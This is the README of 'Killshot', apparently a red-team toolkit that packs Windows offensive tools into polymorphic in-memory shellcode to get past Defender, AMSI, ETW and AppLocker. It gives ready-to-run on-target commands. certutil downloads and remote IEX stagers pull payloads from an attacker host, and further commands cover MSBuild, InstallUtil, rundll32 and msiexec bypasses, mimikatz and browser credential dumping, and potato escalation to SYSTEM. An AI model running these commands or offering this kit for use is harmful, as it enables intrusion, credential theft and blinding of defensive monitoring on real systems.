# Killshot

Polymorphic AV/AMSI bypass toolkit. Converts any Windows PE or .NET tool into
in-memory shellcode that bypasses Defender on fully-patched Windows 11 24H2.

## How It Works

```
PE/.NET binary ──► Donut (shellcode) ──► base64 (.enc) ──► runner.exe loads in-memory
                                                              │
                                              ETW patched ────┘
                                              RW→RX memory
                                              Randomized injection method
                                              Polymorphic per build
```

Every invocation produces unique binaries — randomized variable names, API string
splits, junk functions, and multiple injection methods (CreateThread, EnumWindows
callback, CreateFiber). Runner.exe patches ETW before execution to blind telemetry.

## Quick Start

```bash
# 1. Install (downloads tools + sets up compilers)
./install.sh

# 2. Generate everything
killshot generate --all -l 10.10.14.5

# 3. Serve files
killshot serve

# 4. On target
certutil -urlcache -split -f http://10.10.14.5:8000/runner.exe %TEMP%\r.exe
%TEMP%\r.exe -remote http://10.10.14.5:8000/implant.enc
```

## Toolkit

| Script | Purpose |
|---|---|
| `install.sh` | Downloads tools, installs Go/Donut/garble, verifies everything |
| `killshot.sh` | Main generator — component-based payload generation |
| `killshot.py` | Converts individual tools to Donut shellcode |
| `gen_runner.py` | Generates polymorphic Go shellcode loader |
| `gen_stager.py` | Generates PowerShell stager with AMSI bypass |
| `gen_potato.py` | Converts potato exploits to shellcode with baked-in commands |
| `gen_tool_stager.py` | Generates PowerShell in-memory loaders (fallback) |
| `gen_msi.py` | MSI/DLL AppLocker bypass (custom action DLL via wixl/MinGW) |
| `gen_applocker.py` | MSBuild XML and InstallUtil C# AppLocker bypasses |

## Included Tools

### Credential Access
| Tool | Description | Default Params |
|---|---|---|
| Rubeus | Kerberos abuse | `triage` |
| Mimikatz | Credential extraction | `privilege::debug sekurlsa::logonpasswords exit` |
| SharpDPAPI | DPAPI credential extraction | `triage` |
| SharpChrome | Chrome saved credentials | `logins` |

### Enumeration
| Tool | Description | Default Params |
|---|---|---|
| SharpHound | BloodHound AD collector | `-c All --memcache` |
| Certify | AD CS certificate abuse | `find /vulnerable` |
| Seatbelt | Host security survey | `-group=all -full` |
| winPEAS | Privilege escalation scanner | `quiet` |

### Privilege Escalation
| Tool | Description | Default Params |
|---|---|---|
| SharpUp | Privesc checks (GhostPack) | `audit` |
| GodPotato | SeImpersonate → SYSTEM | Baked stager command |
| PrintSpoofer | SeImpersonate → SYSTEM | Baked stager command |
| BadPotato | SeImpersonate → SYSTEM | Baked stager command |
| EfsPotato | SeImpersonate → SYSTEM | Baked stager command |
| KrbRelayUp | Kerberos relay privesc | `relay` |

### Lateral Movement & Tunneling
| Tool | Description | Default Params |
|---|---|---|
| Ligolo-ng agent | Tunneling agent | `-connect LHOST:11601 -ignore-cert` |
| Chisel | Tunnel client | `client LHOST:8443 R:socks` |

### Active Directory
| Tool | Description | Default Params |
|---|---|---|
| Whisker | Shadow Credentials attack | `list` |

## Usage

All operations go through a single `killshot` command:

```bash
# Info & verification
killshot help                                           # Show help
killshot list                                           # List available tools
killshot check                                          # Verify installation
killshot serve                                          # HTTP server for workspace

# Generate specific components (mix and match)
killshot generate --runner                              # Polymorphic runner.exe only
killshot generate --implant -l 10.10.14.5               # C2 implant shellcode (Sliver)
killshot generate --implant -l 10.10.14.5 -f msf        # C2 implant shellcode (MSF)
killshot generate --stager                              # PowerShell stager with AMSI bypass
killshot generate --tool Rubeus --params 'kerberoast'   # Single tool to shellcode
killshot generate --tool Certify                        # Single tool (default params)
killshot generate --tools                               # All tools to shellcode
killshot generate --potato GodPotato -c 'cmd /c whoami' # Single potato exploit
killshot generate --potatoes -c 'cmd /c whoami'         # All potato exploits
killshot generate --loaders                             # PowerShell tool loaders

# AppLocker bypass payloads (requires implant shellcode)
killshot generate --msi                                 # MSI/DLL for msiexec/rundll32
killshot generate --msbuild                             # MSBuild XML inline C# task
killshot generate --installutil                         # InstallUtil C# source

# Generate everything at once
killshot generate --all -l 10.10.14.5
```

### install.sh — Setup & Maintenance

```bash
# Full install
./install.sh

# Update all tools to latest versions
./install.sh --update

# Only download tool binaries
./install.sh --tools-only

# Verify installation
./install.sh --check
```

## On-Target Usage

```powershell
# Download runner once
certutil -urlcache -split -f http://LHOST:PORT/runner.exe %TEMP%\r.exe

# Run any tool
%TEMP%\r.exe -remote http://LHOST:PORT/rubeus.enc
%TEMP%\r.exe -remote http://LHOST:PORT/mimikatz.enc
%TEMP%\r.exe -remote http://LHOST:PORT/seatbelt.enc
%TEMP%\r.exe -remote http://LHOST:PORT/godpotato.enc

# Or use the stager (AMSI bypass + auto-download runner + load implant)
IEX(IWR -UseBasicParsing http://LHOST:PORT/stager.ps1)
```

### AppLocker Bypass (when EXE execution is blocked)

```powershell
# MSBuild — download XML, execute via trusted .NET binary
certutil -urlcache -split -f http://LHOST:PORT/build.xml %TEMP%\b.xml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe %TEMP%\b.xml

# InstallUtil — download CS, compile on target, execute via trusted binary
certutil -urlcache -split -f http://LHOST:PORT/service.cs %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library /out:%TEMP%\s.dll %TEMP%\s.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U %TEMP%\s.dll

# DLL via rundll32 — trusted path or direct execution
certutil -urlcache -split -f http://LHOST:PORT/update.dll %TEMP%\u.dll
rundll32.exe %TEMP%\u.dll,ExportName 0

# MSI via msiexec (if wixl-generated .msi available)
certutil -urlcache -split -f http://LHOST:PORT/update.msi %TEMP%\u.msi
msiexec /i %TEMP%\u.msi /qn
```

## Evasion Techniques

- **Polymorphic runner** — unique binary each build (random identifiers, junk functions, API string splits)
- **ETW patching** — patches `EtwEventWrite` to `ret` before shellcode execution
- **Multiple injection methods** — randomly selects CreateThread, EnumWindows callback, or CreateFiber
- **RW→RX memory** — allocates as read-write, copies shellcode, then flips to read-execute
- **Sandbox detection** — timing check catches accelerated sleep in sandboxes
- **Donut shellcode** — position-independent shellcode from any PE/.NET, runs entirely in-memory
- **AMSI bypass** — reflection-based patching with byte-array obfuscated class names
- **Garble compilation** — Go binary obfuscation (when supported by Go version)
- **No disk artifacts** — tools never touch disk, loaded directly into memory via runner
- **AppLocker bypass** — MSBuild XML, InstallUtil, MSI custom action, rundll32 via trusted paths
- **XOR-encrypted DLL** — loader DLL with randomized exports and encrypted shellcode

## Directory Structure

```
avbypass/
├── install.sh            # Installer
├── killshot.sh           # Main payload generator
├── killshot.py           # Tool-to-shellcode converter
├── gen_runner.py         # Polymorphic runner generator
├── gen_stager.py         # PowerShell stager generator
├── gen_potato.py         # Potato privesc generator
├── gen_msi.py            # MSI/DLL AppLocker bypass generator
├── gen_applocker.py      # MSBuild/InstallUtil AppLocker bypass
├── gen_tool_stager.py    # Tool loader generator
├── go.mod / go.sum       # Go module (cached for offline)
├── tools/
│   ├── potatoes/         # Potato exploit binaries
│   │   ├── GodPotato.exe
│   │   ├── PrintSpoofer.exe
│   │   ├── BadPotato.exe
│   │   └── EfsPotato.exe
│   └── windows/          # Offensive tool binaries
│       ├── Rubeus.exe
│       ├── SharpHound.exe
│       ├── Certify.exe
│       ├── Seatbelt.exe
│       ├── SharpDPAPI.exe
│       ├── SharpUp.exe
│       ├── SharpChrome.exe
│       ├── winPEAS.exe
│       ├── Whisker.exe
│       ├── KrbRelayUp.exe
│       ├── mimikatz.exe
│       ├── ligolo-agent.exe
│       ├── chisel.exe
│       └── Invoke-Mimikatz.ps1
└── go/                   # Local Go toolchain (after install)
```

## Requirements

| Component | Required | Purpose |
|---|---|---|
| Python 3 | Yes | Runs all generators |
| Go >= 1.24 | Yes | Cross-compiles runner.exe |
| donut-shellcode | Yes | PE-to-shellcode conversion |
| garble | Optional | Go binary obfuscation |
| mingw-w64 | Optional | CGO cross-compilation |
| upx | Optional | Binary size reduction |
| Sliver or MSF | Yes* | C2 implant generation |

*Only needed for initial implant. Tools work independently via `killshot.py`.

## Tested On

- Windows 11 24H2 (Build 26200) — Defender + cloud protection level 2
- Windows Server 2022 — Defender with default settings
